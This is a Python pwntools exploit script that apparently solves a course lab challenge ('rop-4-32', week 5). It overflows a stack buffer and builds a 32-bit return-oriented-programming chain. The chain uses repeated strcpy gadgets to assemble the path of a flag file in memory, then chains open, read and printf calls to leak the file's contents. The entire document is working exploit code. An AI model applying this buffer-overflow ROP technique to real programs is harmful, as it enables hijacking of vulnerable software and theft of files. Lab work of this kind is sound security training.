#!/usr/bin/env python

from pwn import *
import os

context.terminal = ['tmux', 'splitw', '-h']
p = process("./rop-4-32")
#p = process("./rop-x")
#gdb.attach(p)
buf = "A" *0x88 + "BBBB"

rd = p32(0x80483c0)
opn = p32(0x8048400)
pf = p32(0x80483d0)
strcpy = p32(0x804858e)

pop2_ret = p32(0x0804873a)
pop_pop_pop_ret = p32(0x08048739)

#/
buf += strcpy
buf += pop2_ret
buf += p32(0x804a800)
buf += p32(0x80487e0)

#h
buf += strcpy
buf += pop2_ret
buf += p32(0x804a801)
buf += p32(0x8048769)

#o
buf += strcpy
buf += pop2_ret
buf += p32(0x804a802)
buf += p32(0x8048774)

#m
buf += strcpy
buf += pop2_ret
buf += p32(0x804a803)
buf += p32(0x804877e)

#e
buf += strcpy
buf += pop2_ret
buf += p32(0x804a804)
buf += p32(0x804876a)

#/
buf += strcpy
buf += pop2_ret
buf += p32(0x804a805)
buf += p32(0x80487e0)

#l
buf += strcpy
buf += pop2_ret
buf += p32(0x804a806)
buf += p32(0x804878b)

#a
buf += strcpy
buf += pop2_ret
buf += p32(0x804a807)
buf += p32(0x804878c)

#b
buf += strcpy
buf += pop2_ret
buf += p32(0x804a808)
buf += p32(0x8048772)

#s
buf += strcpy
buf += pop2_ret
buf += p32(0x804a809)
buf += p32(0x8048780)

#/
buf += strcpy
buf += pop2_ret
buf += p32(0x804a80a)
buf += p32(0x80487e0)

#w
buf += strcpy
buf += pop2_ret
buf += p32(0x804a80b)
buf += p32(0x8048775)

#e
buf += strcpy
buf += pop2_ret
buf += p32(0x804a80c)
buf += p32(0x804876a)

#e
buf += strcpy
buf += pop2_ret
buf += p32(0x804a80d)
buf += p32(0x804876a)

#k
buf += strcpy
buf += pop2_ret
buf += p32(0x804a80e)
buf += p32(0x8048770)

#5
buf += strcpy
buf += pop2_ret
buf += p32(0x804a80f)
buf += p32(0x80487b5)

#/
buf += strcpy
buf += pop2_ret
buf += p32(0x804a810)
buf += p32(0x80487e0)

#r
buf += strcpy
buf += pop2_ret
buf += p32(0x804a811)
buf += p32(0x8048773)

#o
buf += strcpy
buf += pop2_ret
buf += p32(0x804a812)
buf += p32(0x8048774)

#p
buf += strcpy
buf += pop2_ret
buf += p32(0x804a813)
buf += p32(0x804877f)

#-
buf += strcpy
buf += pop2_ret
buf += p32(0x804a814)
buf += p32(0x80487bb)

#4
buf += strcpy
buf += pop2_ret
buf += p32(0x804a815)
buf += p32(0x80487b4)

#-
buf += strcpy
buf += pop2_ret
buf += p32(0x804a816)
buf += p32(0x80487bb)

#3
buf += strcpy
buf += pop2_ret
buf += p32(0x804a817)
buf += p32(0x80487b3)

#2
buf += strcpy
buf += pop2_ret
buf += p32(0x804a818)
buf += p32(0x80487b2)

#/
buf += strcpy
buf += pop2_ret
buf += p32(0x804a819)
buf += p32(0x80487e0)

#f
buf += strcpy
buf += pop2_ret
buf += p32(0x804a81a)
buf += p32(0x8048778)

#l
buf += strcpy
buf += pop2_ret
buf += p32(0x804a81b)
buf += p32(0x804878b)

#a
buf += strcpy
buf += pop2_ret
buf += p32(0x804a81c)
buf += p32(0x804878c)

#g
buf += strcpy
buf += pop2_ret
buf += p32(0x804a81d)
buf += p32(0x8048792)

#\0
buf += strcpy
buf += pop2_ret
buf += p32(0x804a81e)
buf += p32(0x8048794)


buf += opn
buf += pop_pop_pop_ret
buf += p32(0x804a800) #/home/labs/week5/rop-4-32/flag
buf += p32(0)
buf += p32(0)

buf += rd
buf += pop_pop_pop_ret
buf += p32(3)
buf += p32(0x804a800)
buf += p32(100)

buf += pf
buf += pop_pop_pop_ret
buf += p32(0x804a800)
buf += p32(0)
buf += p32(0)

print(len(buf))


p.send(buf)
p.interactive()
